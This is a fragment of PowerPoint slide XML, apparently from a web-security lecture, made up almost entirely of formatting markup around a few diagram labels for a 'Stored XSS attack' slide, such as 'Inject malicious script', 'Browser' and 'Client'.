                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2846"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2471">
                <a:solidFill>
                  <a:srgbClr val="1333FF"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2262"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2030" b="1">
                <a:solidFill>
                  <a:srgbClr val="06BC00"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Inject</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2030">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="101000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2030" b="1">
                <a:solidFill>
                  <a:srgbClr val="06BC00"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>malicious  script</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2030">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="160784" name="object 14"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8110258" y="5427850"/>
            <a:ext cx="334776" cy="320768"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId5"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="160785" name="object 15"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8135471" y="5436254"/>
            <a:ext cx="282949" cy="267540"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId6"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="160786" name="object 16"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8135471" y="5436254"/>
            <a:ext cx="284350" cy="267540"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 415290"/>
              <a:gd name="T1" fmla="*/ 0 h 379729"/>
              <a:gd name="T2" fmla="*/ 944 w 415290"/>
              <a:gd name="T3" fmla="*/ 0 h 379729"/>
              <a:gd name="T4" fmla="*/ 944 w 415290"/>
              <a:gd name="T5" fmla="*/ 1713 h 379729"/>
              <a:gd name="T6" fmla="*/ 0 w 415290"/>
              <a:gd name="T7" fmla="*/ 1713 h 379729"/>
              <a:gd name="T8" fmla="*/ 0 w 415290"/>
              <a:gd name="T9" fmla="*/ 0 h 3797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15290" h="379729">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="415086" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="415086" y="379399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="379399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="FF2A06">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34963231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295931" y="71438"/>
            <a:ext cx="5593136" cy="678968"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8779">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr spc="-21" dirty="0"/>
              <a:t>Stored </a:t>
            </a:r>
            <a:r>
              <a:rPr spc="-311" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr spc="-11" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr spc="49" dirty="0"/>
              <a:t>attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161795" name="object 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2794468" y="2996174"/>
            <a:ext cx="1294279" cy="1392331"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161796" name="object 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2821081" y="3004578"/>
            <a:ext cx="1242453" cy="1339103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId3"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2821081" y="3004578"/>
            <a:ext cx="1242453" cy="814838"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="009CFD"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1677">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPts val="7"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1941">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="244938" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPts val="4"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" spc="-7" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Browser</a:t>
            </a:r>
            <a:endParaRPr sz="1677">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3036795" y="2536732"/>
            <a:ext cx="815228" cy="380232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8779" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2471" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Client</a:t>
            </a:r>
            <a:endParaRPr sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161799" name="object 7"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7509343" y="4395508"/>
            <a:ext cx="1553415" cy="1410541"/>
